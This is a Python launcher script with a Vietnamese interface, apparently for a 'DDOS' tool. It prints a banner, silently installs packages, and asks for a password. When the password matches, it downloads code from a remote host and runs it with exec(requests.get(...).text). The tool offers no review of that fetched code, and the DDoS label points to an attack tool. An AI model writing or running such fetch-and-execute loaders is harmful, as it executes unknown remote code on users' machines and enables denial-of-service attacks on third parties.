import os
try:
    import requests,colorama,prettytable
except:
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install prettytable")
import threading, requests, ctypes, random, json, time, base64, sys, re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init, Fore
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#màu
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
whiteb="\033[1;37m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#đánh dấu bản quyền
ndp_tool="\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=>  "
thanh = "\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
#Config

def banner():
    print(f"""
\033[1;33m╔═════════════════════════════════════════════════╗
\033[1;33m║                                                 \033[1;33m║
\033[1;33m║  {Fore.WHITE}████████╗██╗  ██╗                              \033[1;33m║
\033[1;33m║  {Fore.WHITE}╚══██╔══╝██║  ██║  \033[1;32m Admin\033[1;37m : \033[1;36mThiệu Hoàng        \033[1;33m║
\033[1;33m║     {Fore.WHITE}██║   ███████║   \033[1;32mNgày\033[1;37m : \033[1;36m{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} \033[1;33m║
\033[1;33m║     {Fore.WHITE}██║   ██╔══██║  \033[1;32m YouTube\033[1;37m : \033[1;36m@thieuhoang75    \033[1;33m║
\033[1;33m║     {Fore.WHITE}██║   ██║  ██║  \033[1;32m Version\033[1;37m : \033[1;36mTool Gộp Vip     \033[1;33m║
\033[1;33m║     {Fore.WHITE}╚═╝   ╚═╝  ╚═╝                              \033[1;33m║
\033[1;33m║      \033[1;32mBox Zalo \033[1;37m: \033[1;36mhttps://zalo.me/g/ahnoav496   \033[1;33m  ║
\033[1;33m╚═════════════════════════════════════════════════╝
""")
 
# =======================[ NHẬP KEY ]=======================
os.system("cls" if os.name == "nt" else "clear")
banner()
import json,requests,time
from time import strftime

print("\033[1;31m[\033[1;39mDDOS\033[1;31m] \033[1;32mVui Lòng Nhập Mật Khẩu Để Vào Tool: ")
chon = int(input('\033[1;31m[\033[1;37mNhập\033[1;31m] \033[1;37m=>'))
if chon == 24112006 :
    exec(requests.get('https://hosttool2425.vuvanchien.xyz/banddos.php').text)
else :
    print("Mật Khẩu Sai")